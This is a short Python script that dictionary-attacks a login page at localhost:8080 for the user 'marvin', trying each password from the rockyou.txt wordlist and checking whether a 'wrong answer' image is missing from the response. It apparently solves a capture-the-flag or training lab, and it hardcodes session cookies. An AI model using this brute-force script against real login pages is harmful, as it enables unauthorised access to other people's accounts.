import requests

# Define the URL and the necessary headers
url = 'http://localhost:8080/index.php?page=signin'
headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en',
    'Connection': 'keep-alive',
    'Cookie': 'csrftoken=6la8Whx71kgYwiu1HUqby8bGHiSkJf2j9rlT80LuniGLvkJzAtbJNOx4EK5rKe; sessionid=wkyan96hdzkvna3h6vfkck2lbsci7d30; I_am_admin=68934a3e9455fa72420237eb05902327',
    'Referer': 'http://localhost:8080/index.php?page=signin',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Brave";v="126"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
}

username = 'marvin'
failure_html_snippet = '<img src="images/WrongAnswer.gif" alt="">'

def brute_force_login(password):
    params = {
        'username': username,
        'password': password,
        'Login': 'Login'
    }
    response = requests.get(url, headers=headers, params=params)
    if failure_html_snippet not in response.text:
        print(f"Success! The password is: {password}")
        return True
    else:
        print(f"Failed attempt with password: {password}")
        return False

def main():
    # Load passwords from rockyou.txt
    with open('rockyou.txt', 'r', encoding='utf-8', errors='ignore') as file:
        passwords = [line.strip() for line in file]

    for password in passwords:
        if brute_force_login(password):
            break

if __name__ == "__main__":
    main()